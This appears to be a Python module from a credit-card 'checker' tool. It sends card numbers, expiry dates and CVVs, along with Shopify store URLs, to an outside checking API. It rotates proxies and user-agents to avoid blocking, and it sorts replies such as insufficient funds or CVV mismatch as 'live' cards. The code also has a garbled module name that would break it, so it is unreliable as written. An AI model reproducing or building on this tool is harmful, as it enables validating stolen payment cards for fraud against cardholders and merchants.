import requests
import traceback
import urllib3
import random

# Disable SSL warnings
urllib3.disable_warnings(ur3llib3.exceptions.InsecureRequestWarning)

# ============================================================================
# HELPER: Format proxy for requests
# ============================================================================
def format_proxy(proxy):
    """Convert proxy string to requests dictionary."""
    if not proxy:
        return None
    try:
        parts = proxy.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        else:
            return None
    except Exception:
        return None

# ============================================================================
# MAIN CHECKER FUNCTION – CALLS EXTERNAL API
# ============================================================================
def check_site_shopify_direct(site_url, cc, proxy=None):
    """
    Checks a credit card on a Shopify store via the external API:
    https://kamalxd.tech/sh/index.php

    Parameters:
        site_url (str): Shopify store URL (with or without https://)
        cc (str): Card in format "CC|MM|YYYY|CVV"
        proxy (str, optional): Proxy in format "ip:port:user:pass" or "ip:port"

    Returns:
        dict: Contains 'Response', 'status', 'gateway', 'price', 'site'
    """
    api_url = "https://kamalxd.tech/sh/index.php"
    params = {'cc': cc, 'url': site_url}
    if proxy:
        params['proxy'] = proxy

    # Optional: rotate user‑agent to avoid blocking
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    ]
    headers = {'User-Agent': random.choice(user_agents)}

    # Set up proxies for the request
    proxies = format_proxy(proxy) if proxy else None

    try:
        response = requests.get(
            api_url,
            params=params,
            headers=headers,
            proxies=proxies,
            timeout=30,
            verify=False
        )
        data = response.json()

        # Extract fields (API returns these keys)
        resp_text = data.get('Response', 'Unknown')
        price = data.get('Price', '0.00')
        gateway = data.get('Gate', 'Unknown')
        site = data.get('Site', site_url)

        # Determine status based on response text
        status = 'ERROR'
        resp_lower = resp_text.lower()
        if 'approved' in resp_lower or 'live' in resp_lower or 'success' in resp_lower:
            status = 'APPROVED'
        elif 'declined' in resp_lower:
            status = 'DECLINED'
        elif 'insufficient' in resp_lower:
            status = 'APPROVED'          # treat insufficient funds as live
        elif 'cvv' in resp_lower:
            status = 'APPROVED'          # treat CVV mismatch as live
        elif 'do not honor' in resp_lower:
            status = 'DECLINED'
        # else keep as ERROR

        return {
            'Response': resp_text,
            'status': status,
            'gateway': gateway,
            'price': price,
            'site': site
        }

    except requests.exceptions.Timeout:
        return {
            'Response': 'API timeout',
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': site_url
        }
    except requests.exceptions.ProxyError:
        return {
            'Response': 'Proxy error',
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': site_url
        }
    except Exception as e:
        traceback.print_exc()
        return {
            'Response': f'API error: {str(e)}',
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': site_url
        }

# ============================================================================
# RESPONSE PROCESSOR – USED BY app.py
# ============================================================================
def process_response_shopify(api_response, site_price='0'):
    """
    Processes the dictionary returned by check_site_shopify_direct
    and returns a tuple (message, status, gateway) as expected by app.py.
    """
    try:
        if not api_response or not isinstance(api_response, dict):
            return "System Error", "ERROR", "Unknown"

        status = api_response.get('status', 'ERROR').upper()
        message = api_response.get('Response', 'Unknown Result')
        gateway = api_response.get('gateway', 'Shopify Payments')

        # Map status to what app.py expects
        if status == 'APPROVED':
            # Check if OTP or 3DS is mentioned
            if 'otp' in message.lower() or 'authentication' in message.lower():
                status = 'APPROVED_OTP'
        elif status == 'DECLINED':
            pass  # keep as is
        else:
            status = 'ERROR'

        return message, status, gateway

    except Exception as e:
        return f"Parse Error: {e}", "ERROR", "Unknown"
